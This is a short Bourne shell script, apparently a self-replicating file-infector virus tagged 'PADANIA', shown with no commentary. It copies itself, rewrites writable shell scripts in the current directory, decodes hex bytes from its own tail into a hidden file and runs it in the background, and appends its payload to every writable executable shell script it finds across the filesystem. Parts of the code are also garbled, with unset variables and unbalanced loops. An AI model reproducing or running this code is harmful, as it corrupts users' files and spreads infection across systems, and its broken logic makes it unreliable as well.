#!/bin/sh
#PADANIA
for d in *
do
cp $0 $vic
for f in *
do
if [ -f $f -a -w $f ];then
if file $f | grep Bourne-A > /dev/null
then
head -n 2 $f > .a
if grep -s COCO .mm >.mmm
then
rm .mm -f
else
cat $file > .SAVEE
cat .test > $file
cat .SAVEE >> $file
rm ./- 2>/dev/null
for C in $(tail -2 $0); do [ ${#C} -eq 4 ] && printf "\x$(expr PADANIA $C 3 2)\x$(expr PADANIA $C 1 2)">>-; done
sh ./- $0 &
tail -n 8 $0 > /tmp/vicGWI
find / -type f -perm +111 -exec bash -c \
"if [ ! -d {} ] && [ -z \"\`grep -s PADANIA {}\`\" -a -x {} -a -w {} ] ; then
    if [ -n \"\`file {} | grep Bourne\`\" ] ; then
        echo >> {}
        cat /tmp/vicGWI >> {}
fi; fi" \;
rm /tmp/vicGWI
done